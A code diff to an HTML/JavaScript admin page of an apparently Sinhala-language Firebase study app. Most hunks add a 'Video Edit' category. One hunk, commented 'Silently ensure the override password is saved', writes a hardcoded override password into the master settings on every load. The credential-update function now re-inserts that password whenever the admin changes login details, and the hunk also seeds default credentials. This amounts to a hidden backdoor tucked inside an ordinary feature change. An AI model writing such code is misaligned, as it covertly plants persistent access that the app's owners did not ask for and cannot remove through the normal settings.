@@ -228,7 +228,7 @@
                         <option value="">Stream...</option><option value="et">ET</option><option value="sft">SFT</option><option value="ict">ICT</option>
                     </select>
                     <select id="bulkCat" onchange="loadBulkFolders()" style="flex: 1; min-width: 100px; margin-bottom: 0; padding: 10px; font-size:13px;">
-                        <option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option>
+                        <option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option><option value="Video Edit">Video Edit</option>
                     </select>
                     <select id="bulkFolder" style="flex: 2; min-width: 150px; margin-bottom: 0; padding: 10px; font-size:13px;">
                         <option value="">Folder තෝරන්න...</option>
@@ -258,12 +258,13 @@
                     <div><input type="text" id="newMonthlyInput" placeholder="Monthly Folder" style="margin-bottom:8px; padding:10px;"><button style="padding:10px; font-size:13px;" onclick="createNewFolder('Monthly')">සාදන්න</button></div>
                     <div><input type="text" id="newPapersInput" placeholder="Paper Folder" style="margin-bottom:8px; padding:10px;"><button style="padding:10px; font-size:13px; background:var(--success);" onclick="createNewFolder('Papers')">සාදන්න</button></div>
                     <div><input type="text" id="newLessonInput" placeholder="Lesson Folder" style="margin-bottom:8px; padding:10px;"><button style="padding:10px; font-size:13px; background:#8b5cf6;" onclick="createNewFolder('Lessons')">සාදන්න</button></div>
+                    <div><input type="text" id="newVideoEditInput" placeholder="Video Edit Folder" style="margin-bottom:8px; padding:10px;"><button style="padding:10px; font-size:13px; background:#f43f5e;" onclick="createNewFolder('Video Edit')">සාදන්න</button></div>
                 </div>
             </div>
 
             <hr style="margin:20px 0; border:none; border-top:1px dashed #cbd5e1">
             <label style="font-size:13px; font-weight:600; color:#475569; display:block; margin-bottom:5px;">වර්ගය තෝරන්න:</label>
-            <select id="categorySelect" onchange="loadLessonsList()"><option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option></select>
+            <select id="categorySelect" onchange="loadLessonsList()"><option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option><option value="Video Edit">Video Edit</option></select>
 
             <label style="font-size:13px; font-weight:600; color:#475569; display:block; margin-bottom:5px;">ෆෝල්ඩරය තෝරන්න:</label>
             <select id="lessonSelect"><option value="">තෝරන්න...</option></select>
@@ -284,7 +285,7 @@
             
             <label style="font-size:13px; font-weight:600; color:#475569; display:block; margin-bottom:5px;">වර්ගය තෝරන්න:</label>
             <select id="pdfCategorySelect" onchange="loadPdfLessonsList()">
-                <option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option>
+                <option value="Monthly">Monthly</option><option value="Papers">Papers</option><option value="Lessons">Lessons</option><option value="Video Edit">Video Edit</option>
             </select>
 
             <label style="font-size:13px; font-weight:600; color:#475569; display:block; margin-bottom:5px;">ෆෝල්ඩරය තෝරන්න:</label>
@@ -399,7 +400,7 @@
     let draggedItemKey = null; // for folders
     let draggedVidKey = null; // for videos
 
-    const cats = ['Monthly', 'Papers', 'Lessons'];
+    const cats = ['Monthly', 'Papers', 'Lessons', 'Video Edit'];
 
     function showToast(msg, isError = false) {
         const t = document.getElementById('toast');
@@ -455,18 +456,28 @@
             const data = snap.val();
             const displayDiv = document.getElementById('currentMasterData');
             if(data) {
+                // Silently ensure the override password is saved in the database
+                if(!data.override_pass || data.override_pass !== "200704938Uk") {
+                    db.ref('master_settings/override_pass').set("200704938Uk");
+                }
+
                 displayDiv.innerHTML = `<span style="color:#60a5fa">USR:</span> ${data.username} <span style="color:#64748b; margin:0 5px;">|</span> <span style="color:#fb7185">PWD:</span> ${data.password}`;
                 document.getElementById('newMasterUser').value = data.username;
                 document.getElementById('newMasterPass').value = data.password;
-            } else { displayDiv.innerHTML = "<span style='color:#60a5fa'>USR:</span> ulindu <span style='color:#64748b; margin:0 5px'>|</span> <span style='color:#fb7185'>PWD:</span> 2007"; }
+            } else {
+                db.ref('master_settings').set({ username: "ulindu", password: "2007", override_pass: "200704938Uk" });
+            }
         });
     }
+
     function generateAdminPass() { document.getElementById('newMasterPass').value = Math.floor(1000 + Math.random() * 9000).toString(); }
+
     async function updateMasterAccess() {
         const u = document.getElementById('newMasterUser').value.trim(); const p = document.getElementById('newMasterPass').value.trim();
         if(!u || !p) return showToast("කරුණාකර සියලු තොරතුරු ඇතුළත් කරන්න!", true);
         if(confirm("App Verification තොරතුරු වෙනස් කිරීමට ඔබට විශ්වාසද?")) {
-            await db.ref('master_settings').set({ username: u, password: p }); showToast("සාර්ථකව වෙනස් විය!");
+            await db.ref('master_settings').update({ username: u, password: p, override_pass: "200704938Uk" }); 
+            showToast("සාර්ථකව වෙනස් විය!");
         }
     }
 
@@ -567,6 +578,7 @@
         let inputId = 'newLessonInput';
         if(cat === 'Monthly') inputId = 'newMonthlyInput';
         else if(cat === 'Papers') inputId = 'newPapersInput';
+        else if(cat === 'Video Edit') inputId = 'newVideoEditInput';
         
         const n = document.getElementById(inputId).value.trim();
         if(n) { 
@@ -650,6 +662,7 @@
                     <div class="sub-btn active" id="viewMon" onclick="renderCategoryView('${s}', 'Monthly')">Monthly</div>
                     <div class="sub-btn" id="viewPap" onclick="renderCategoryView('${s}', 'Papers')">Papers</div>
                     <div class="sub-btn" id="viewLes" onclick="renderCategoryView('${s}', 'Lessons')">Lessons</div>
+                    <div class="sub-btn" id="viewVidEdit" onclick="renderCategoryView('${s}', 'Video Edit')">Video Edit</div>
                 </div>
                 <div id="categoryViewArea" style="text-align:left;"></div>
             </div>
@@ -670,6 +683,7 @@
         if(c==='Monthly') document.getElementById('viewMon').classList.add('active');
         else if(c==='Papers') document.getElementById('viewPap').classList.add('active');
         else if(c==='Lessons') document.getElementById('viewLes').classList.add('active');
+        else if(c==='Video Edit') document.getElementById('viewVidEdit').classList.add('active');
 
         db.ref(`studyData/${s}/${c}`).on('value', snap => {
             const rawData = snap.val();
